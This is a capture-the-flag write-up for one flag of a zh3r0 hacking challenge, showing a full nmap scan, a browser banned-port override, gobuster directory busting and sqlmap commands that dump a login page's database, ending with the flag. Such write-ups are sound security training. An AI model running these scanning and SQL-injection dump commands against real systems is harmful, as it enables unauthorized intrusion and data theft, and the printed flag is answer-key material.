Subset of subset of hacking machines challenges

# Challenge
## Flag 7
We are given a URL - ``` hackit.zh3r0.ml ```

# Solution

> Optional: Find IP address of the given domain using **ping**

Since it is a machine, begin with a full port scan

``` nmap -T4 -sC -sV -p- hackit.zh3r0.ml ```

> Note: Not sure if I used the right [options], run ``` nmap --help ``` for better understanding and optimisation

This reveals all the open ports and services running on each port. Also notice that the services running are all mixed up.

```
22/tcp    open     http
25/tcp    filtered smtp
99/tcp    open     ssh
324/tcp   open     ftp
4994/tcp  open     unknown
11211/tcp filtered memcache
```

* Since ``` http ``` is running on port ``` 22 ```, it will be restricted by the browser and we will not be able to access it directly. There are two ways around this problem.
	1. Allow restricted ports in Firefox Browser
		* Go to ``` about:config ``` in Firefox address bar
		* Add the string name and value as ```   (network.security.ports.banned.override, 22) ```
		* Access ``` http://hackit.zh3r0.ml:22/robots.txt ```
	2. Access the webpage through cURL or wget
	``` curl http://hackit.zh3r0.ml:22/robots.txt ```
	``` wget http://hackit.zh3r0.ml:22/robots.txt ```
* There is a clue which has something to do with **ads**. There are two ways to go about this.
	1. Make a guess to visit ``` http://hackit.zh3r0.ml:22/ads.txt ```
		* Obtain a string encoded in ``` Base 62 ``` (Damn, these aren't the bases I am aware of :tired_face:)
		* Use https://gchq.github.io/CyberChef/ to decode and get another webpage ``` /index2.html ```
		* This page contains a login
	2. Use directory busting tools on ``` http://hackit.zh3r0.ml:22/ ```
		* ``` gobuster dir -u http://hackit.zh3r0.ml:22/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm ```
		* ``` dirbuster ``` - GUI tool
		* This also reveals ``` /index2.html ``` without getting to ``` ads.txt ```
* The login in page ``` /index2.html ``` seems to be vulnerable to **SQL Injection**, we can exploit it using ``` sqlmap ```
	* To retrieve databases, use the command
	``` sqlmap -u http://139.59.3.42:22/ --data="username=f4k3&amp;password=fl4g" --method POST --dbs --batch ```
	* There are 4 databases, of which **users** seems interesting
	* To retrieve all information about a database, use the command
	``` sqlmap -u http://139.59.3.42:22 --data="username=f4k3&amp;password=fl4g" --method POST -D users --dump all --batch ```
	* This gets us **Flag 7**
	``` zh3r0{Dangit_you_are_good!} ```
	> Note: **sqlmap** takes quite sometime, so grab a snack while you watch the flag unfold :cookie:
